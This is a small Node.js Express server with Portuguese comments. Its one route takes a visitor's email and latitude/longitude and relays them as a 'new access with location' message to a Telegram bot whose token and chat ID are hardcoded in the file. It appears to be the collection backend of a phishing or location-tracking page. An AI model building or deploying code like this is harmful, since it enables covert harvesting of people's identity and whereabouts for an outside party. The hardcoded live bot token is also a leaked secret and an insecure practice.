import express from 'express';
import fetch from 'node-fetch';
import cors from 'cors'; 

const app = express();
const port = process.env.PORT || 3000;


// Configurações do Telegram
const TELEGRAM_TOKEN = '7359276298:AAFKWa0pEZU9WY0FwnkC-drQDNVQxQZXtLc';
const CHAT_ID = '5379369411';

app.use(cors());
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// Rota que recebe o POST com email, lat, lng
app.post('/send', async (req, res) => {
  const email = req.body.email || 'não informado';
  const lat = req.body.lat || 'desconhecido';
  const lng = req.body.lng || 'desconhecido';

  const mensagem = `Novo acesso com localização:\n\nEmail: ${email}\nLatitude: ${lat}\nLongitude: ${lng}`;

  const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;

  try {
    const response = await fetch(url, {
      method: 'POST',
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: mensagem
      })
    });

    const json = await response.json();

    if (json.ok) {
      res.send("<h3>Obrigado! Seus dados foram recebidos.</h3>");
    } else {
      res.status(500).send("Erro ao enviar para o Telegram.");
    }
  } catch (err) {
    console.error("Erro:", err);
    res.status(500).send("Erro interno.");
  }
});

app.listen(port, () => {
  console.log(`Servidor rodando em http://localhost:${port}`);
});
